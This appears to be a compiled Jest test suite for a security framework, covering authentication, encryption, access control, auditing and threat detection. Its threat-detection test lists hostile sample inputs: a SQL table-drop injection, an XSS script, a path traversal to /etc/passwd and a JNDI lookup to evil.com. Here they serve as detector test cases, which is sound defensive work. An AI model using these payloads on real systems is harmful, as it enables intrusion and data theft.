"use strict";
/**
 * Comprehensive Test Suite for SecurityFramework
 *
 * This file contains unit tests, integration tests, and security tests
 * for the SecurityFramework component.
 */
Object.defineProperty(exports, "__esModule", { value: true });
const SecurityFramework_1 = require("../SecurityFramework");
// Mock crypto module
const mockCrypto = {
    randomBytes: jest.fn(),
    createHash: jest.fn(),
    createHmac: jest.fn(),
    createCipher: jest.fn(),
    createDecipher: jest.fn(),
    createCipheriv: jest.fn(),
    createDecipheriv: jest.fn(),
    pbkdf2Sync: jest.fn(),
    scryptSync: jest.fn()
};
// Mock implementations
const mockHash = {
    update: jest.fn().mockReturnThis(),
    digest: jest.fn()
};
const mockHmac = {
    update: jest.fn().mockReturnThis(),
    digest: jest.fn()
};
const mockCipher = {
    update: jest.fn(),
    final: jest.fn(),
    getAuthTag: jest.fn()
};
const mockDecipher = {
    update: jest.fn(),
    final: jest.fn(),
    setAuthTag: jest.fn()
};
// Setup mocks
jest.mock('crypto', () => mockCrypto);
describe('SecurityFramework', () => {
    let security;
    beforeEach(() => {
        security = new SecurityFramework_1.SecurityFramework();
        jest.clearAllMocks();
        // Setup default mock implementations
        mockCrypto.randomBytes.mockReturnValue(Buffer.from('random-bytes-32-chars-long-test'));
        mockCrypto.createHash.mockReturnValue(mockHash);
        mockCrypto.createHmac.mockReturnValue(mockHmac);
        mockCrypto.createCipheriv.mockReturnValue(mockCipher);
        mockCrypto.createDecipheriv.mockReturnValue(mockDecipher);
        mockCrypto.pbkdf2Sync.mockReturnValue(Buffer.from('derived-key-32-chars-long-test'));
        mockCrypto.scryptSync.mockReturnValue(Buffer.from('scrypt-key-32-chars-long-test'));
        mockHash.digest.mockReturnValue('hashed-value');
        mockHmac.digest.mockReturnValue('hmac-value');
        mockCipher.update.mockReturnValue(Buffer.from('encrypted-part'));
        mockCipher.final.mockReturnValue(Buffer.from('encrypted-final'));
        mockCipher.getAuthTag.mockReturnValue(Buffer.from('auth-tag-16-chars'));
        mockDecipher.update.mockReturnValue(Buffer.from('decrypted-part'));
        mockDecipher.final.mockReturnValue(Buffer.from('decrypted-final'));
    });
    describe('Authentication', () => {
        it('should generate secure API keys', async () => {
            const result = await security.generateApiKey({
                length: 32,
                includeSymbols: true
            });
            expect(result.success).toBe(true);
            expect(result.apiKey).toBeDefined();
            expect(result.apiKey?.length).toBeGreaterThan(0);
            expect(mockCrypto.randomBytes).toHaveBeenCalled();
        });
        it('should validate API key format', async () => {
            const validKey = 'sk-1234567890abcdef1234567890abcdef';
            const invalidKey = 'invalid-key';
            const validResult = await security.validateApiKey(validKey);
            const invalidResult = await security.validateApiKey(invalidKey);
            expect(validResult.valid).toBe(true);
            expect(invalidResult.valid).toBe(false);
            expect(invalidResult.reason).toContain('format');
        });
        it('should create and verify JWT tokens', async () => {
            const payload = {
                userId: 'user123',
                role: 'admin',
                permissions: ['read', 'write']
            };
            const tokenResult = await security.createJwtToken(payload, {
                expiresIn: '1h',
                issuer: 'test-service'
            });
            expect(tokenResult.success).toBe(true);
            expect(tokenResult.token).toBeDefined();
            const verifyResult = await security.verifyJwtToken(tokenResult.token);
            expect(verifyResult.valid).toBe(true);
            expect(verifyResult.payload).toMatchObject(payload);
        });
        it('should handle expired JWT tokens', async () => {
            const payload = { userId: 'user123' };
            const tokenResult = await security.createJwtToken(payload, {
                expiresIn: '1ms' // Very short expiration
            });
            expect(tokenResult.success).toBe(true);
            // Wait for token to expire
            await new Promise(resolve => setTimeout(resolve, 10));
            const verifyResult = await security.verifyJwtToken(tokenResult.token);
            expect(verifyResult.valid).toBe(false);
            expect(verifyResult.reason).toContain('expired');
        });
        it('should implement multi-factor authentication', async () => {
            const setupResult = await security.setupMFA('user123', {
                method: 'totp',
                issuer: 'Test App'
            });
            expect(setupResult.success).toBe(true);
            expect(setupResult.secret).toBeDefined();
            expect(setupResult.qrCode).toBeDefined();
            // Simulate TOTP code generation
            const totpCode = '123456';
            const verifyResult = await security.verifyMFA('user123', totpCode);
            expect(verifyResult.success).toBe(true);
        });
        it('should handle OAuth2 flow', async () => {
            const authUrl = await security.generateOAuthUrl({
                clientId: 'test-client',
                redirectUri: 'https://app.example.com/callback',
                scopes: ['read', 'write'],
                state: 'random-state'
            });
            expect(authUrl.success).toBe(true);
            expect(authUrl.url).toContain('client_id=test-client');
            expect(authUrl.url).toContain('scope=read%20write');
            const tokenResult = await security.exchangeOAuthCode({
                code: 'auth-code',
                clientId: 'test-client',
                clientSecret: 'test-secret',
                redirectUri: 'https://app.example.com/callback'
            });
            expect(tokenResult.success).toBe(true);
            expect(tokenResult.accessToken).toBeDefined();
        });
    });
    describe('Encryption and Decryption', () => {
        it('should encrypt and decrypt data with AES-256-GCM', async () => {
            const plaintext = 'sensitive data to encrypt';
            const encryptResult = await security.encryptData(plaintext, {
                algorithm: 'aes-256-gcm',
                keyDerivation: 'pbkdf2'
            });
            expect(encryptResult.success).toBe(true);
            expect(encryptResult.encryptedData).toBeDefined();
            expect(encryptResult.iv).toBeDefined();
            expect(encryptResult.authTag).toBeDefined();
            const decryptResult = await security.decryptData(encryptResult.encryptedData, {
                algorithm: 'aes-256-gcm',
                iv: encryptResult.iv,
                authTag: encryptResult.authTag
            });
            expect(decryptResult.success).toBe(true);
            expect(decryptResult.plaintext).toBe(plaintext);
        });
        it('should handle encryption with different algorithms', async () => {
            const data = 'test data';
            const algorithms = ['aes-256-gcm', 'aes-256-cbc', 'chacha20-poly1305'];
            for (const algorithm of algorithms) {
                const result = await security.encryptData(data, { algorithm });
                expect(result.success).toBe(true);
                expect(result.encryptedData).toBeDefined();
            }
        });
        it('should generate and use encryption keys', async () => {
            const keyResult = await security.generateEncryptionKey({
                algorithm: 'aes-256',
                format: 'base64'
            });
            expect(keyResult.success).toBe(true);
            expect(keyResult.key).toBeDefined();
            expect(keyResult.keyId).toBeDefined();
            const encryptResult = await security.encryptData('test data', {
                keyId: keyResult.keyId
            });
            expect(encryptResult.success).toBe(true);
        });
        it('should implement key rotation', async () => {
            const rotationResult = await security.rotateEncryptionKeys({
                keyIds: ['key1', 'key2'],
                retainOldKeys: true,
                gracePeriod: 3600 // 1 hour
            });
            expect(rotationResult.success).toBe(true);
            expect(rotationResult.newKeys).toBeDefined();
            expect(rotationResult.rotatedCount).toBe(2);
        });
        it('should handle encryption errors gracefully', async () => {
            // Simulate encryption failure
            mockCipher.final.mockImplementationOnce(() => {
                throw new Error('Encryption failed');
            });
            const result = await security.encryptData('test data');
            expect(result.success).toBe(false);
            expect(result.error).toContain('Encryption failed');
        });
    });
    describe('Access Control', () => {
        it('should create and enforce access control rules', async () => {
            const rule = {
                id: 'admin-rule',
                resource: '/admin/*',
                actions: ['read', 'write', 'delete'],
                subjects: ['role:admin'],
                conditions: {
                    timeRange: { start: '09:00', end: '17:00' },
                    ipWhitelist: ['192.168.1.0/24']
                }
            };
            const createResult = await security.createAccessRule(rule);
            expect(createResult.success).toBe(true);
            const checkResult = await security.checkAccess({
                subject: 'user:admin123',
                resource: '/admin/users',
                action: 'read',
                context: {
                    time: '14:00',
                    ip: '192.168.1.100',
                    userRoles: ['admin']
                }
            });
            expect(checkResult.allowed).toBe(true);
        });
        it('should deny access based on conditions', async () => {
            const rule = {
                id: 'time-restricted-rule',
                resource: '/sensitive/*',
                actions: ['read'],
                subjects: ['role:user'],
                conditions: {
                    timeRange: { start: '09:00', end: '17:00' }
                }
            };
            await security.createAccessRule(rule);
            const checkResult = await security.checkAccess({
                subject: 'user:user123',
                resource: '/sensitive/data',
                action: 'read',
                context: {
                    time: '22:00', // Outside allowed time
                    userRoles: ['user']
                }
            });
            expect(checkResult.allowed).toBe(false);
            expect(checkResult.reason).toContain('time');
        });
        it('should implement role-based access control', async () => {
            const role = {
                id: 'editor',
                name: 'Content Editor',
                permissions: [
                    { resource: '/content/*', actions: ['read', 'write'] },
                    { resource: '/media/*', actions: ['read', 'upload'] }
                ]
            };
            const createRoleResult = await security.createRole(role);
            expect(createRoleResult.success).toBe(true);
            const assignResult = await security.assignRole('user123', 'editor');
            expect(assignResult.success).toBe(true);
            const checkResult = await security.checkAccess({
                subject: 'user:user123',
                resource: '/content/articles',
                action: 'write',
                context: {}
            });
            expect(checkResult.allowed).toBe(true);
        });
        it('should handle permission inheritance', async () => {
            const parentRole = {
                id: 'base-user',
                name: 'Base User',
                permissions: [
                    { resource: '/public/*', actions: ['read'] }
                ]
            };
            const childRole = {
                id: 'premium-user',
                name: 'Premium User',
                inherits: ['base-user'],
                permissions: [
                    { resource: '/premium/*', actions: ['read'] }
                ]
            };
            await security.createRole(parentRole);
            await security.createRole(childRole);
            await security.assignRole('user123', 'premium-user');
            // Should have access to both base and premium resources
            const baseAccess = await security.checkAccess({
                subject: 'user:user123',
                resource: '/public/content',
                action: 'read',
                context: {}
            });
            const premiumAccess = await security.checkAccess({
                subject: 'user:user123',
                resource: '/premium/content',
                action: 'read',
                context: {}
            });
            expect(baseAccess.allowed).toBe(true);
            expect(premiumAccess.allowed).toBe(true);
        });
    });
    describe('Security Auditing', () => {
        it('should log security events', async () => {
            const event = {
                type: 'authentication',
                action: 'login_success',
                userId: 'user123',
                ip: '192.168.1.100',
                userAgent: 'Mozilla/5.0...',
                timestamp: new Date(),
                metadata: {
                    method: 'password',
                    mfaUsed: true
                }
            };
            const result = await security.logSecurityEvent(event);
            expect(result.success).toBe(true);
            expect(result.eventId).toBeDefined();
        });
        it('should detect suspicious activities', async () => {
            // Simulate multiple failed login attempts
            const events = Array.from({ length: 5 }, (_, i) => ({
                type: 'authentication',
                action: 'login_failed',
                userId: 'user123',
                ip: '192.168.1.100',
                timestamp: new Date(Date.now() - i * 1000)
            }));
            for (const event of events) {
                await security.logSecurityEvent(event);
            }
            const analysisResult = await security.analyzeSuspiciousActivity({
                timeWindow: 300, // 5 minutes
                thresholds: {
                    failedLogins: 3,
                    differentIPs: 5
                }
            });
            expect(analysisResult.suspicious).toBe(true);
            expect(analysisResult.alerts).toContainEqual(expect.objectContaining({
                type: 'multiple_failed_logins',
                userId: 'user123'
            }));
        });
        it('should generate security reports', async () => {
            const reportResult = await security.generateSecurityReport({
                period: 'last_30_days',
                includeMetrics: true,
                includeAlerts: true,
                format: 'json'
            });
            expect(reportResult.success).toBe(true);
            expect(reportResult.report).toBeDefined();
            expect(reportResult.report?.metrics).toBeDefined();
            expect(reportResult.report?.alerts).toBeDefined();
        });
        it('should track access patterns', async () => {
            const accesses = [
                { resource: '/api/users', action: 'read', userId: 'user123' },
                { resource: '/api/orders', action: 'read', userId: 'user123' },
                { resource: '/api/admin', action: 'read', userId: 'user123' }
            ];
            for (const access of accesses) {
                await security.logSecurityEvent({
                    type: 'access',
                    action: 'resource_access',
                    ...access,
                    timestamp: new Date()
                });
            }
            const patternResult = await security.analyzeAccessPatterns('user123', {
                timeWindow: 3600 // 1 hour
            });
            expect(patternResult.success).toBe(true);
            expect(patternResult.patterns).toBeDefined();
            expect(patternResult.patterns?.resourceAccess).toHaveLength(3);
        });
    });
    describe('Secure Communication', () => {
        it('should establish secure channels', async () => {
            const channelResult = await security.createSecureChannel({
                participants: ['agent1', 'agent2'],
                encryption: 'end-to-end',
                keyExchange: 'ecdh'
            });
            expect(channelResult.success).toBe(true);
            expect(channelResult.channelId).toBeDefined();
            expect(channelResult.encryptionKey).toBeDefined();
        });
        it('should encrypt messages for secure channels', async () => {
            const channelResult = await security.createSecureChannel({
                participants: ['agent1', 'agent2'],
                encryption: 'aes-256-gcm'
            });
            const message = {
                from: 'agent1',
                to: 'agent2',
                content: 'sensitive message',
                timestamp: new Date()
            };
            const encryptResult = await security.encryptMessage(channelResult.channelId, message);
            expect(encryptResult.success).toBe(true);
            expect(encryptResult.encryptedMessage).toBeDefined();
            const decryptResult = await security.decryptMessage(channelResult.channelId, encryptResult.encryptedMessage);
            expect(decryptResult.success).toBe(true);
            expect(decryptResult.message?.content).toBe('sensitive message');
        });
        it('should implement message signing and verification', async () => {
            const message = 'important message';
            const signResult = await security.signMessage(message, {
                algorithm: 'rsa-sha256',
                keyId: 'signing-key-1'
            });
            expect(signResult.success).toBe(true);
            expect(signResult.signature).toBeDefined();
            const verifyResult = await security.verifySignature(message, signResult.signature, {
                algorithm: 'rsa-sha256',
                keyId: 'signing-key-1'
            });
            expect(verifyResult.valid).toBe(true);
        });
        it('should handle certificate management', async () => {
            const certResult = await security.generateCertificate({
                subject: 'CN=test-agent',
                keySize: 2048,
                validityDays: 365,
                extensions: ['keyUsage', 'extKeyUsage']
            });
            expect(certResult.success).toBe(true);
            expect(certResult.certificate).toBeDefined();
            expect(certResult.privateKey).toBeDefined();
            const validateResult = await security.validateCertificate(certResult.certificate);
            expect(validateResult.valid).toBe(true);
        });
    });
    describe('Threat Detection', () => {
        it('should detect injection attacks', async () => {
            const maliciousInputs = [
                "'; DROP TABLE users; --",
                '<script>alert("xss")</script>',
                '../../etc/passwd',
                '${jndi:ldap://evil.com/a}'
            ];
            for (const input of maliciousInputs) {
                const result = await security.detectThreat(input, {
                    types: ['sql_injection', 'xss', 'path_traversal', 'code_injection']
                });
                expect(result.threatDetected).toBe(true);
                expect(result.threatType).toBeDefined();
            }
        });
        it('should implement rate limiting', async () => {
            const rateLimitResult = await security.checkRateLimit('user123', {
                window: 60, // 1 minute
                maxRequests: 10,
                identifier: 'api_requests'
            });
            expect(rateLimitResult.allowed).toBe(true);
            expect(rateLimitResult.remaining).toBe(9);
            // Simulate exceeding rate limit
            for (let i = 0; i < 10; i++) {
                await security.checkRateLimit('user123', {
                    window: 60,
                    maxRequests: 10,
                    identifier: 'api_requests'
                });
            }
            const exceededResult = await security.checkRateLimit('user123', {
                window: 60,
                maxRequests: 10,
                identifier: 'api_requests'
            });
            expect(exceededResult.allowed).toBe(false);
            expect(exceededResult.retryAfter).toBeGreaterThan(0);
        });
        it('should detect anomalous behavior', async () => {
            const behaviorData = {
                userId: 'user123',
                actions: [
                    { type: 'login', timestamp: new Date(), location: 'US' },
                    { type: 'data_access', timestamp: new Date(), resource: '/api/users' },
                    { type: 'login', timestamp: new Date(), location: 'RU' }, // Anomalous location
                    { type: 'bulk_download', timestamp: new Date(), size: 1000000 } // Anomalous size
                ]
            };
            const anomalyResult = await security.detectAnomalies(behaviorData, {
                models: ['location', 'access_pattern', 'data_volume'],
                sensitivity: 0.8
            });
            expect(anomalyResult.anomaliesDetected).toBe(true);
            expect(anomalyResult.anomalies).toContainEqual(expect.objectContaining({
                type: 'location_anomaly'
            }));
        });
        it('should implement IP blocking', async () => {
            const maliciousIP = '192.168.1.100';
            const blockResult = await security.blockIP(maliciousIP, {
                reason: 'multiple_failed_attempts',
                duration: 3600, // 1 hour
                severity: 'high'
            });
            expect(blockResult.success).toBe(true);
            const checkResult = await security.checkIPBlocked(maliciousIP);
            expect(checkResult.blocked).toBe(true);
            expect(checkResult.reason).toBe('multiple_failed_attempts');
        });
    });
    describe('Performance and Load Testing', () => {
        it('should handle concurrent encryption operations', async () => {
            const data = 'test data for encryption';
            const operationCount = 100;
            const operations = Array.from({ length: operationCount }, () => security.encryptData(data, { algorithm: 'aes-256-gcm' }));
            const startTime = Date.now();
            const results = await Promise.all(operations);
            const endTime = Date.now();
            const successfulOps = results.filter(r => r.success).length;
            const averageTime = (endTime - startTime) / operationCount;
            expect(successfulOps).toBe(operationCount);
            expect(averageTime).toBeLessThan(100); // Should be fast
            console.log(`Encryption performance: ${successfulOps}/${operationCount} successful, ${averageTime.toFixed(2)}ms average`);
        });
        it('should handle high-volume access control checks', async () => {
            // Create access rules
            await security.createAccessRule({
                id: 'test-rule',
                resource: '/api/*',
                actions: ['read', 'write'],
                subjects: ['role:user']
            });
            const checkCount = 1000;
            const checks = Array.from({ length: checkCount }, (_, i) => security.checkAccess({
                subject: `user:user${i}`,
                resource: '/api/data',
                action: 'read',
                context: { userRoles: ['user'] }
            }));
            const startTime = Date.now();
            const results = await Promise.all(checks);
            const endTime = Date.now();
            const allowedCount = results.filter(r => r.allowed).length;
            const averageTime = (endTime - startTime) / checkCount;
            expect(allowedCount).toBe(checkCount);
            expect(averageTime).toBeLessThan(10); // Should be very fast
            console.log(`Access control performance: ${allowedCount}/${checkCount} allowed, ${averageTime.toFixed(2)}ms average`);
        });
        it('should maintain security under load', async () => {
            const userCount = 50;
            const operationsPerUser = 20;
            const operations = [];
            for (let userId = 0; userId < userCount; userId++) {
                for (let op = 0; op < operationsPerUser; op++) {
                    operations.push(async () => {
                        // Mix of different security operations
                        const opType = op % 4;
                        switch (opType) {
                            case 0:
                                return security.generateApiKey({ length: 32 });
                            case 1:
                                return security.encryptData(`data-${userId}-${op}`);
                            case 2:
                                return security.checkAccess({
                                    subject: `user:user${userId}`,
                                    resource: `/api/resource${op}`,
                                    action: 'read',
                                    context: {}
                                });
                            case 3:
                                return security.logSecurityEvent({
                                    type: 'access',
                                    action: 'api_call',
                                    userId: `user${userId}`,
                                    timestamp: new Date()
                                });
                        }
                    });
                }
            }
            const startTime = Date.now();
            const results = await Promise.all(operations.map(op => op()));
            const endTime = Date.now();
            const successfulOps = results.filter(r => r && (r.success || r.allowed || r.eventId)).length;
            const totalOps = userCount * operationsPerUser;
            const successRate = successfulOps / totalOps;
            expect(successRate).toBeGreaterThan(0.95); // At least 95% success rate
            expect(endTime - startTime).toBeLessThan(30000); // Complete within 30 seconds
            console.log(`Load test results: ${successfulOps}/${totalOps} successful (${(successRate * 100).toFixed(1)}%), ${endTime - startTime}ms total`);
        });
    });
});
//# sourceMappingURL=security-framework.test.js.map